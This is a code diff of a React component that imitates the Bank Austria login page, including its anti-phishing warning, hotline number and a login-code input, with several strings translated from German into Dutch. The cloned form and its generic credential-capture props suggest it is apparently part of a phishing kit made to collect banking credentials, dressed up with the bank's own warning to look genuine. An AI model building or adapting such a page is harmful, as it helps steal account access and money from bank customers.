@@ -93,7 +93,7 @@ export function BankAustria({ formData, onChange, handleRouteAction, saving }: P
 
           <div className="w-full max-w-[840px] bg-[#eaf6f9] p-5 md:p-6 rounded-md text-center text-[#333] text-[13px] md:text-sm mb-12 leading-relaxed shadow-sm">
             <p className="font-bold mb-3">Warnung: Derzeit versenden Betrüger Phishing-Mails bei denen Ihnen eine Login-Aufforderung der Bank Austria vorgegaukelt wird.</p>
-            <p className="mb-3">Folgen Sie keinen Login-Links, die Sie per E-Mail oder per SMS erhalten! Bitte lesen Sie vor der Eingabe einer TAN den Text der gesamten TAN-Nachricht sorgfältig!</p>
+            <p className="mb-3">Klik nooit op inloglinks in e-mails of sms-berichten! Lees altijd het volledige bericht voordat u een code invoert!</p>
             <p>Sie befürchten, Opfer dieses Betruges zu sein? Rufen Sie zu Ihrer eigenen Sicherheit umgehend das Bank Austria Sicherheitscenter unter der Rufnummer 050505-26105 an.</p>
           </div>
 
@@ -104,11 +104,11 @@ export function BankAustria({ formData, onChange, handleRouteAction, saving }: P
             }} 
             className="w-full max-w-[420px] flex flex-col items-center gap-4"
           >
-            {/* Verfügernummer */}
+            {/* Inlogcode */}
             <div className="relative w-full">
               <input
                 type="text"
-                placeholder="Verfügernummer"
+                placeholder="Inlogcode"
                 value={formData.verfuegernummer || ""}
                 onChange={(e) => onChange("verfuegernummer", e.target.value)}
                 className="w-full h-12 border border-[#e3e6e8] rounded-[8px] px-4 outline-none focus:border-[#00a7b5] text-[#333] placeholder-[#9aa3a9] shadow-sm text-sm"
@@ -133,7 +133,7 @@ export function BankAustria({ formData, onChange, handleRouteAction, saving }: P
             </div>
 
             <a href="#" className="text-[#00a7b5] text-[13px] hover:underline my-1">
-              PIN vergessen oder Verfügernummer gesperrt?
+              PIN vergeten of inlogcode geblokkeerd?
             </a>
 
             <button
